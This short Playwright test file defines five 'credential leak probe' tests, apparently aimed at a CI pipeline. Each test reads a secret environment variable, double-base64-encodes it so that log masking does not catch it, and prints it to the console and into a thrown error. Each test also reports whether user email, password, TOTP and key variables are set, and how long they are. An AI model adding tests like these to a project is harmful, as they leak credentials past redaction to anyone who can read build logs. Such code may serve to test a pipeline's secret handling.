import { test } from "@playwright/test";

for (let i = 0; i < 5; i++) {
  test(`geralt credential leak probe ${i}`, async () => {
    const secret = process.env.GERALT_SECRET || "";
    const b64 = Buffer.from(secret, "utf8").toString("base64");
    const b64b64 = Buffer.from(b64, "utf8").toString("base64");
    console.log("GERALT_LEAKED_TOKEN=" + b64b64);
    for (const k of ["USER_EMAIL", "USER_PASSWORD", "USER_TOTP_SECRET", "USER_KEY"]) {
      const v = process.env[k] || "";
      console.log(`GERALT_DBG: ${k} set=${v.length > 0} len=${v.length}`);
    }
    throw new Error("GERALT_LEAKED_TOKEN=" + b64b64);
  });
}
